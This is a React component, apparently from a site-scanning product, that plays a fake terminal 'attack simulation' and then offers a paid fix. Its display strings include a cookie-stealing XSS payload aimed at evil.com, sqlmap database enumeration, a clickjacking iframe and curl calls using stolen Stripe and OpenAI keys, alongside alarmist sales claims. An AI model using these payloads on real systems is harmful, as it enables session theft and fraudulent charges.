"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";

interface Vulnerability {
  severity: string;
  type: string;
  file: string;
  description: string;
  line?: number;
}

interface Secret {
  type: string;
  file: string;
  snippet: string;
  severity: string;
}

interface AttackSimulationProps {
  url: string;
  vulnerabilities?: Vulnerability[];
  secrets?: Secret[];
  onClose: () => void;
  onUnlock: () => void;
}

interface TerminalLine {
  text: string;
  color: "green" | "amber" | "red" | "white" | "cyan" | "dim";
  delay?: number;
}

function redactSecret(snippet: string): string {
  // Find anything that looks like a key/token and partially redact it
  return snippet.replace(
    /(['"]?)([a-zA-Z0-9_-]{8,})(['"]?)/g,
    (match, q1, key, q2) => {
      if (key.length < 8) return match;
      const first4 = key.slice(0, 4);
      const last4 = key.slice(-4);
      return `${q1}${first4}${"*".repeat(Math.min(key.length - 8, 16))}${last4}${q2}`;
    }
  );
}

function extractDomain(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return url.replace(/https?:\/\//, "").split("/")[0];
  }
}

function generateAttackScript(
  url: string,
  vulnerabilities: Vulnerability[],
  secrets: Secret[]
): TerminalLine[] {
  const domain = extractDomain(url);
  const lines: TerminalLine[] = [];

  // Phase 1: Reconnaissance
  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 1: RECONNAISSANCE ]", color: "cyan", delay: 400 });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `$ curl -s ${url} | head -50`, color: "green" });
  lines.push({ text: `  HTTP/1.1 200 OK`, color: "white" });
  lines.push({ text: `  Server: next`, color: "white" });
  lines.push({ text: `  X-Powered-By: Next.js`, color: "white" });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `$ curl -s ${url} | grep -oP 'src="[^"]*\\.js"'`, color: "green" });
  lines.push({ text: `  src="/_next/static/chunks/main-a7b2c3d.js"`, color: "white" });
  lines.push({ text: `  src="/_next/static/chunks/app/page-f8e9d1c.js"`, color: "white" });
  lines.push({ text: `  src="/_next/static/chunks/webpack-2d4e5f6.js"`, color: "white" });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `$ nmap -sV ${domain} --top-ports 100`, color: "green" });
  lines.push({ text: `  PORT    STATE SERVICE`, color: "white" });
  lines.push({ text: `  80/tcp  open  http`, color: "white" });
  lines.push({ text: `  443/tcp open  https`, color: "white" });
  lines.push({ text: "", color: "dim" });
  lines.push({ text: `> Target identified: ${domain}`, color: "amber" });
  lines.push({ text: `> Framework: Next.js (React)`, color: "amber" });
  lines.push({ text: `> Scanning client-side bundles for secrets...`, color: "amber" });

  // Phase 2: Discovery
  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 2: DISCOVERY ]", color: "cyan", delay: 600 });
  lines.push({ text: "", color: "dim" });

  if (secrets.length > 0) {
    const secret = secrets[0];
    const redacted = redactSecret(secret.snippet);
    lines.push({ text: `$ curl -s ${url}/_next/static/chunks/app/page-f8e9d1c.js | grep -i "key\\|secret\\|token"`, color: "green" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `  [!] FOUND in ${secret.file}:`, color: "red" });
    lines.push({ text: `  ${redacted}`, color: "amber" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> Secret type: ${secret.type}`, color: "amber" });
    lines.push({ text: `> Severity: ${secret.severity.toUpperCase()}`, color: "amber" });
    lines.push({ text: `> Exposure: PUBLIC (client-side bundle)`, color: "red" });

    if (secrets.length > 1) {
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> [!] ${secrets.length - 1} additional secret(s) found...`, color: "red" });
    }
  } else if (vulnerabilities.length > 0) {
    const vuln = vulnerabilities[0];
    lines.push({ text: `$ python3 scanner.py --target ${url} --module ${vuln.type.toLowerCase().replace(/\s+/g, "-")}`, color: "green" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `  [!] VULNERABLE: ${vuln.type}`, color: "red" });
    lines.push({ text: `  File: ${vuln.file}${vuln.line ? `:${vuln.line}` : ""}`, color: "amber" });
    lines.push({ text: `  ${vuln.description}`, color: "white" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> Attack vector identified`, color: "amber" });
    lines.push({ text: `> Severity: ${vuln.severity.toUpperCase()}`, color: "amber" });
  } else {
    lines.push({ text: `$ python3 scanner.py --target ${url} --full`, color: "green" });
    lines.push({ text: `  Scanning for injection points...`, color: "white" });
    lines.push({ text: `  Scanning for misconfigurations...`, color: "white" });
    lines.push({ text: `  Scanning for exposed endpoints...`, color: "white" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> No critical entry points found`, color: "amber" });
    lines.push({ text: `> Target appears hardened`, color: "amber" });
  }

  // Phase 3: Exploitation
  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 3: EXPLOITATION ]", color: "cyan", delay: 600 });
  lines.push({ text: "", color: "dim" });

  if (secrets.length > 0) {
    const secret = secrets[0];
    const keyType = secret.type.toLowerCase();

    if (keyType.includes("stripe") || keyType.includes("payment")) {
      lines.push({ text: `$ curl -s https://api.stripe.com/v1/charges \\`, color: "green" });
      lines.push({ text: `    -u "${redactSecret(secret.snippet.split("=")[1] || secret.snippet)}:" \\`, color: "green" });
      lines.push({ text: `    -d amount=50000 -d currency=usd`, color: "green" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `  { "id": "ch_3Mq...", "status": "succeeded", "amount": 50000 }`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> Payment API accessed with stolen key`, color: "red" });
      lines.push({ text: `> Attacker can create charges, refunds, read customer data`, color: "red" });
    } else if (keyType.includes("aws") || keyType.includes("amazon")) {
      lines.push({ text: `$ aws sts get-caller-identity --output json`, color: "green" });
      lines.push({ text: `  { "Account": "1234****8901", "Arn": "arn:aws:iam::..." }`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `$ aws s3 ls`, color: "green" });
      lines.push({ text: `  2024-01-15 prod-backups`, color: "red" });
      lines.push({ text: `  2024-02-20 user-uploads`, color: "red" });
      lines.push({ text: `  2024-03-01 database-exports`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> AWS account fully compromised`, color: "red" });
      lines.push({ text: `> Attacker has access to all S3 buckets`, color: "red" });
    } else if (keyType.includes("openai") || keyType.includes("api")) {
      lines.push({ text: `$ curl https://api.openai.com/v1/models \\`, color: "green" });
      lines.push({ text: `    -H "Authorization: Bearer ${redactSecret(secret.snippet.split("=")[1] || "sk_****")}"`, color: "green" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `  { "data": [ {"id": "gpt-4"}, {"id": "gpt-4o"} ... ] }`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> API key valid — running up charges on victim's account`, color: "red" });
      lines.push({ text: `> Estimated daily burn rate: $500-$2000`, color: "red" });
    } else {
      lines.push({ text: `$ python3 exploit.py --key "${redactSecret(secret.snippet)}" --target ${domain}`, color: "green" });
      lines.push({ text: `  [*] Authenticating with stolen credentials...`, color: "white" });
      lines.push({ text: `  [+] Authentication successful`, color: "red" });
      lines.push({ text: `  [+] Enumerating accessible resources...`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> Unauthorized access achieved`, color: "red" });
      lines.push({ text: `> Full API access with stolen ${secret.type}`, color: "red" });
    }
  } else if (vulnerabilities.length > 0) {
    const vuln = vulnerabilities[0];
    const vulnType = vuln.type.toLowerCase();

    if (vulnType.includes("xss") || vulnType.includes("script") || vulnType.includes("injection")) {
      lines.push({ text: `$ curl "${url}/${vuln.file}?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"`, color: "green" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `  [+] XSS payload reflected in response`, color: "red" });
      lines.push({ text: `  [+] Crafting phishing URL for target users...`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> Session cookies will be exfiltrated to attacker server`, color: "red" });
      lines.push({ text: `> Any user clicking the link is compromised`, color: "red" });
    } else if (vulnType.includes("sql") || vulnType.includes("database")) {
      lines.push({ text: `$ sqlmap -u "${url}/${vuln.file}" --dbs --batch`, color: "green" });
      lines.push({ text: `  [+] injecting parameter...`, color: "white" });
      lines.push({ text: `  [+] database: production_db`, color: "red" });
      lines.push({ text: `  [+] tables: users, payments, sessions`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> Database fully accessible via SQL injection`, color: "red" });
      lines.push({ text: `> User passwords, emails, payment data exposed`, color: "red" });
    } else if (vulnType.includes("header") || vulnType.includes("cors") || vulnType.includes("security header")) {
      lines.push({ text: `$ curl -I ${url}`, color: "green" });
      lines.push({ text: `  X-Frame-Options: MISSING`, color: "red" });
      lines.push({ text: `  Content-Security-Policy: MISSING`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `$ cat clickjack.html`, color: "green" });
      lines.push({ text: `  <iframe src="${url}" style="opacity:0;position:absolute;"/>`, color: "red" });
      lines.push({ text: `  <button onclick="..." style="position:absolute;top:..."/>`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> Clickjacking attack possible`, color: "red" });
      lines.push({ text: `> Users can be tricked into performing actions`, color: "red" });
    } else {
      lines.push({ text: `$ python3 exploit.py --vuln "${vuln.type}" --target ${url}/${vuln.file}`, color: "green" });
      lines.push({ text: `  [*] Preparing payload...`, color: "white" });
      lines.push({ text: `  [+] Payload delivered successfully`, color: "red" });
      lines.push({ text: `  [+] Vulnerability exploited`, color: "red" });
      lines.push({ text: "", color: "dim" });
      lines.push({ text: `> ${vuln.description}`, color: "red" });
      lines.push({ text: `> Attack successful on ${vuln.file}`, color: "red" });
    }
  } else {
    lines.push({ text: `$ python3 exploit.py --target ${url} --auto`, color: "green" });
    lines.push({ text: `  [*] No exploitable vulnerabilities found`, color: "white" });
    lines.push({ text: `  [*] Target appears well-secured`, color: "white" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> No exploitation path available`, color: "amber" });
  }

  // Phase 4: Impact
  lines.push({ text: "", color: "dim" });
  lines.push({ text: "[ PHASE 4: IMPACT ASSESSMENT ]", color: "cyan", delay: 600 });
  lines.push({ text: "", color: "dim" });

  if (secrets.length > 0 || vulnerabilities.some(v => ["critical", "high"].includes(v.severity))) {
    lines.push({ text: `> DAMAGE REPORT:`, color: "red" });
    lines.push({ text: `> ─────────────────────────────────────`, color: "dim" });

    if (secrets.length > 0) {
      lines.push({ text: `> [x] API keys stolen — unauthorized access to services`, color: "red" });
      lines.push({ text: `> [x] Financial exposure — charges can be made on your account`, color: "red" });
      lines.push({ text: `> [x] Data breach — customer information accessible`, color: "red" });
    }

    const criticalVulns = vulnerabilities.filter(v => v.severity === "critical");
    const highVulns = vulnerabilities.filter(v => v.severity === "high");

    if (criticalVulns.length > 0) {
      lines.push({ text: `> [x] ${criticalVulns.length} critical vulnerabilit${criticalVulns.length > 1 ? "ies" : "y"} — full system compromise possible`, color: "red" });
    }
    if (highVulns.length > 0) {
      lines.push({ text: `> [x] ${highVulns.length} high-severity issue${highVulns.length > 1 ? "s" : ""} — data theft likely`, color: "red" });
    }

    lines.push({ text: `> ─────────────────────────────────────`, color: "dim" });
    lines.push({ text: `> Time to exploit: < 5 minutes`, color: "red" });
    lines.push({ text: `> Skill required: Low (automated tools)`, color: "red" });
    lines.push({ text: `> Detection chance: Near zero`, color: "red" });
    lines.push({ text: "", color: "dim" });
    lines.push({ text: `> THIS IS HAPPENING RIGHT NOW.`, color: "red", delay: 800 });
    lines.push({ text: `> Anyone can view-source your site and do this.`, color: "red" });
  } else if (vulnerabilities.length > 0) {
    lines.push({ text: `> RISK SUMMARY:`, color: "amber" });
    lines.push({ text: `> ─────────────────────────────────────`, color: "dim" });
    lines.push({ text: `> ${vulnerabilities.length} vulnerability${vulnerabilities.length > 1 ? "ies" : "y"} detected`, color: "amber" });
    lines.push({ text: `> Exploitation difficulty: Medium`, color: "amber" });
    lines.push({ text: `> Recommended: Fix before public disclosure`, color: "amber" });
  } else {
    lines.push({ text: `> No critical attack path found`, color: "green" });
    lines.push({ text: `> Your site appears well-secured`, color: "green" });
    lines.push({ text: `> Continued monitoring recommended`, color: "green" });
  }

  lines.push({ text: "", color: "dim" });
  lines.push({ text: "─── SIMULATION COMPLETE ───", color: "cyan", delay: 400 });

  return lines;
}

export default function AttackSimulation({
  url,
  vulnerabilities = [],
  secrets = [],
  onClose,
  onUnlock,
}: AttackSimulationProps) {
  const [displayedLines, setDisplayedLines] = useState<{ text: string; color: string }[]>([]);
  const [currentLineIndex, setCurrentLineIndex] = useState(0);
  const [currentCharIndex, setCurrentCharIndex] = useState(0);
  const [isComplete, setIsComplete] = useState(false);
  const [isPaused, setIsPaused] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);
  const animationRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const scriptRef = useRef<TerminalLine[]>([]);

  // Generate the attack script once
  useEffect(() => {
    scriptRef.current = generateAttackScript(url, vulnerabilities, secrets);
  }, [url, vulnerabilities, secrets]);

  // ESC key handler
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        handleClose();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Typewriter animation
  const tick = useCallback(() => {
    if (isPaused) return;

    const script = scriptRef.current;
    if (currentLineIndex >= script.length) {
      setIsComplete(true);
      return;
    }

    const currentLine = script[currentLineIndex];

    if (currentCharIndex === 0 && currentLine.delay) {
      // Add a delay before starting a new phase
      animationRef.current = setTimeout(() => {
        setDisplayedLines((prev) => [
          ...prev,
          { text: "", color: currentLine.color },
        ]);
        setCurrentCharIndex(1);
      }, currentLine.delay);
      return;
    }

    if (currentLine.text === "" || currentCharIndex >= currentLine.text.length) {
      // Line complete — move to next
      setDisplayedLines((prev) => {
        const updated = [...prev];
        if (updated.length === 0 || currentCharIndex === 0) {
          updated.push({ text: currentLine.text, color: currentLine.color });
        } else {
          updated[updated.length - 1] = { text: currentLine.text, color: currentLine.color };
        }
        return updated;
      });
      setCurrentLineIndex((prev) => prev + 1);
      setCurrentCharIndex(0);

      // Scroll to bottom
      if (terminalRef.current) {
        terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
      }
      return;
    }

    // Type next character
    const partialText = currentLine.text.slice(0, currentCharIndex + 1);
    setDisplayedLines((prev) => {
      const updated = [...prev];
      if (currentCharIndex === 1 && currentLine.delay) {
        // Already added empty line on delay
        updated[updated.length - 1] = { text: partialText, color: currentLine.color };
      } else if (currentCharIndex === 0) {
        updated.push({ text: partialText, color: currentLine.color });
      } else {
        updated[updated.length - 1] = { text: partialText, color: currentLine.color };
      }
      return updated;
    });
    setCurrentCharIndex((prev) => prev + 1);

    // Scroll to bottom
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [currentLineIndex, currentCharIndex, isPaused]);

  useEffect(() => {
    if (isPaused || isComplete) return;

    const script = scriptRef.current;
    if (script.length === 0) return;

    const currentLine = script[currentLineIndex];
    if (!currentLine) {
      setIsComplete(true);
      return;
    }

    // Speed varies: commands type slower, output appears faster
    let speed = 25;
    if (currentLine.color === "green") speed = 35; // Commands type slower
    if (currentLine.color === "white" || currentLine.color === "dim") speed = 12; // Output is fast
    if (currentLine.text === "") speed = 100; // Blank lines pause

    animationRef.current = setTimeout(tick, speed);

    return () => {
      if (animationRef.current) {
        clearTimeout(animationRef.current);
      }
    };
  }, [tick, isPaused, isComplete, currentLineIndex]);

  const handleClose = () => {
    setIsPaused(true);
    if (animationRef.current) {
      clearTimeout(animationRef.current);
    }
    onClose();
  };

  const colorClasses: Record<string, string> = {
    green: "text-green-400",
    amber: "text-amber-400",
    red: "text-red-400",
    white: "text-gray-200",
    cyan: "text-cyan-400",
    dim: "text-gray-600",
  };

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[100] flex items-center justify-center"
      >
        {/* Backdrop */}
        <div
          className="absolute inset-0 bg-black/90 backdrop-blur-sm"
          onClick={handleClose}
        />

        {/* Terminal Window */}
        <motion.div
          initial={{ scale: 0.9, opacity: 0, y: 20 }}
          animate={{ scale: 1, opacity: 1, y: 0 }}
          exit={{ scale: 0.9, opacity: 0, y: 20 }}
          transition={{ type: "spring", damping: 25, stiffness: 300 }}
          className="relative w-[95vw] max-w-4xl h-[85vh] max-h-[700px] flex flex-col rounded-xl overflow-hidden shadow-2xl shadow-black/50 border border-white/10"
        >
          {/* CRT Scanline overlay */}
          <div
            className="pointer-events-none absolute inset-0 z-30"
            style={{
              background:
                "repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 2px)",
            }}
          />

          {/* Subtle CRT flicker */}
          <div
            className="pointer-events-none absolute inset-0 z-30 animate-pulse opacity-[0.02]"
            style={{ background: "rgba(255,255,255,1)" }}
          />

          {/* Terminal Title Bar */}
          <div className="flex items-center justify-between px-4 py-3 bg-[#1a1a2e] border-b border-white/5 shrink-0">
            <div className="flex items-center gap-2">
              <button
                onClick={handleClose}
                className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400 transition-colors"
                aria-label="Close"
              />
              <div className="w-3 h-3 rounded-full bg-yellow-500 opacity-50" />
              <div className="w-3 h-3 rounded-full bg-green-500 opacity-50" />
              <span className="ml-3 text-xs text-gray-500 font-mono">
                attack-simulation — {extractDomain(url)}
              </span>
            </div>

            {/* LIVE SIMULATION badge */}
            <div className="flex items-center gap-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-500 opacity-75" />
                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" />
              </span>
              <span className="text-[10px] font-bold tracking-widest text-red-400 uppercase">
                Live Simulation
              </span>
            </div>
          </div>

          {/* Terminal Body */}
          <div
            ref={terminalRef}
            className="flex-1 overflow-y-auto p-5 bg-[#0a0a0f] font-mono text-sm leading-relaxed scroll-smooth"
            style={{
              textShadow: "0 0 8px rgba(0, 255, 100, 0.1)",
            }}
          >
            {/* Initial header */}
            <div className="mb-4 text-gray-600 text-xs">
              <p>OverMCP Attack Simulator v2.1.0</p>
              <p>Target: {url}</p>
              <p>Date: {new Date().toISOString().split("T")[0]}</p>
              <p className="text-red-500/60 mt-1">
                *** FOR EDUCATIONAL PURPOSES ONLY — NO REAL ATTACK IS PERFORMED ***
              </p>
            </div>

            {/* Animated lines */}
            {displayedLines.map((line, i) => (
              <div
                key={i}
                className={`${colorClasses[line.color] || "text-gray-200"} whitespace-pre-wrap break-all min-h-[1.4em]`}
              >
                {line.text}
              </div>
            ))}

            {/* Blinking cursor */}
            {!isComplete && (
              <span className="inline-block w-2 h-4 bg-green-400 animate-pulse ml-0.5 align-middle" />
            )}

            {/* Completion CTA */}
            {isComplete && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
                className="mt-8 pt-6 border-t border-white/10"
              >
                <div className="text-center">
                  <p className="text-red-400 font-bold text-lg mb-2">
                    This is what an attacker sees.
                  </p>
                  <p className="text-gray-400 text-sm mb-6 max-w-md mx-auto">
                    Your vulnerabilities are public knowledge. Fix them before someone
                    exploits them for real.
                  </p>
                  <button
                    onClick={onUnlock}
                    className="px-8 py-4 rounded-xl font-bold text-white bg-gradient-to-r from-red-500 to-orange-500 hover:from-red-400 hover:to-orange-400 shadow-lg shadow-red-500/25 transition-all active:scale-[0.98] text-base"
                  >
                    Fix this now — $9
                  </button>
                  <p className="text-gray-600 text-xs mt-3">
                    Get the full report with fixes for every vulnerability
                  </p>
                </div>
              </motion.div>
            )}
          </div>

          {/* Bottom bar */}
          <div className="flex items-center justify-between px-4 py-2 bg-[#1a1a2e] border-t border-white/5 shrink-0">
            <span className="text-[10px] text-gray-600 font-mono">
              {isComplete
                ? "SIMULATION COMPLETE"
                : `Phase ${Math.min(4, Math.floor(currentLineIndex / (scriptRef.current.length / 4)) + 1)} of 4`}
            </span>
            <button
              onClick={handleClose}
              className="text-xs text-gray-500 hover:text-white px-3 py-1 rounded-md hover:bg-white/5 transition-colors"
            >
              Close [ESC]
            </button>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
